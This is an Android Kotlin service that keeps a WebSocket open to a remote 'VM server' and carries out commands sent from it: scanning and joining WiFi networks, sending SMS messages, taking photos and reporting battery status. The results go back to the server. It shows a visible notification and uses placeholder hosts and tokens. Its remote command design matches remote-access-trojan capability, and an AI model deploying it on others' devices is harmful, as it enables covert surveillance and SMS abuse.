package com.proactive.sptassist

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import okhttp3.*
import okio.ByteString
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit
import java.util.UUID
import java.util.concurrent.Executors // Make sure this is imported

class WebSocketService : Service() {

    private val TAG = "WebSocketService"
    private var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS) // Disable read timeout for WebSockets
        .build()
    private val gson = Gson()
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val cameraExecutor = Executors.newSingleThreadExecutor() // ADDED THIS

    // --- Constants and Device ID ---
    companion object {
        private const val NOTIFICATION_CHANNEL_ID = "VMControlChannel"
        private const val NOTIFICATION_ID = 101

        private var DEVICE_ID: String = ""
    }

    override fun onCreate() {
        super.onCreate()
        if (DEVICE_ID.isEmpty()) {
            val sharedPrefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
            DEVICE_ID = sharedPrefs.getString("device_unique_id", null) ?: run {
                val newId = UUID.randomUUID().toString()
                sharedPrefs.edit().putString("device_unique_id", newId).apply()
                newId
            }
        }
        Log.d(TAG, "Service created. Device ID: $DEVICE_ID")
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)

        connectWebSocket()
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        disconnectWebSocket()
        serviceScope.cancel()
        cameraExecutor.shutdown() // SHUTDOWN THE EXECUTOR
        Log.d(TAG, "WebSocketService onDestroy")
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    fun disconnectWebSocket() { // Changed from private fun to fun
        webSocket?.close(1000, "App closing")
        webSocket = null
        Log.d(TAG, "WebSocket disconnected.")
    }
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "VM Control Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Maintains connection to VM server for remote commands."
            }
            val notificationManager: NotificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("VM Control Active")
            .setContentText("Connected to VM server. Monitoring commands...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun connectWebSocket() {
        if (webSocket != null) {
            Log.d(TAG, "WebSocket already connected or connecting.")
            return
        }

        // **IMPORTANT: Use wss:// for production with your VM's public IP/Domain and Port**
        // For testing, if you're using HTTP (not recommended for production): ws://your-vm-ip:port
        val wsUrl = "wss://your-vm-ip-or-domain:8443/ws?deviceId=$DEVICE_ID"
        // Example: wss://192.168.1.100:8443/ws?deviceId=abc-123
        // Example: wss://myvmserver.com:8443/ws?deviceId=abc-123

        val request = Request.Builder()
            .url(wsUrl)
            .build()

        Log.d(TAG, "Attempting to connect to WebSocket: $wsUrl")

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "WebSocket opened successfully!")
                val handshakeMessage = mapOf(
                    "type" to "auth",
                    "deviceId" to DEVICE_ID,
                    "token" to "your_auth_token_here_for_vm"
                )
                sendData(gson.toJson(handshakeMessage))
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d(TAG, "Receiving: $text")
                serviceScope.launch {
                    handleIncomingCommand(text)
                }
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                Log.d(TAG, "Receiving binary data: ${bytes.hex()}")
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "Closing: $code / $reason")
                webSocket.close(1000, null)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket Error: ${t.message}", t)
                serviceScope.launch {
                    Log.d(TAG, "Attempting to reconnect WebSocket in 5 seconds...")
                    delay(5000)
                    connectWebSocket()
                }
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "Closed: $code / $reason")
                this@WebSocketService.webSocket = null
            }
        })
    }

    fun sendData(data: String) {
        webSocket?.send(data)
        Log.d(TAG, "Sent: $data")
    }

    fun sendResult(commandId: String, result: Any) {
        val message = mapOf(
            "type" to "result",
            "commandId" to commandId,
            "deviceId" to DEVICE_ID,
            "data" to result
        )
        sendData(gson.toJson(message))
    }

    private suspend fun handleIncomingCommand(jsonCommand: String) {
        try {
            val command = gson.fromJson(jsonCommand, Map::class.java) as Map<String, String>
            val commandType = command["command"]
            val commandId = command["commandId"] ?: "unknown"

            Log.d(TAG, "Executing command: $commandType with ID: $commandId")

            val result: Any = when (commandType) {
                "show_wifi" -> WifiManagerHelper(this).getWifiNetworks()
                "connect_wifi" -> {
                    val ssid = command["ssid"] ?: ""
                    val password = command["password"] ?: ""
                    WifiManagerHelper(this).connectToWifi(ssid, password)
                }
                // REMOVE OR COMMENT OUT THIS LINE FOR LOCATION
                // "get_location" -> LocationHelper(this).getCurrentLocation()
                "send_sms" -> {
                    val number = command["number"] ?: ""
                    val message = command["message"] ?: ""
                    SmsHelper(this).sendSms(number, message)
                }
                "take_photo" -> {
                    CameraHelper(this, cameraExecutor).takePhoto()
                }
                "get_battery_status" -> BatteryHelper(this).getBatteryStatus()
                else -> mapOf("status" to "error", "message" to "Unknown command type: $commandType")
            }
            sendResult(commandId, result)

        } catch (e: Exception) {
            Log.e(TAG, "Error handling command: ${e.message}", e)
            sendResult("unknown", mapOf("status" to "error", "message" to "Failed to process command: ${e.message}"))
        }
    }
}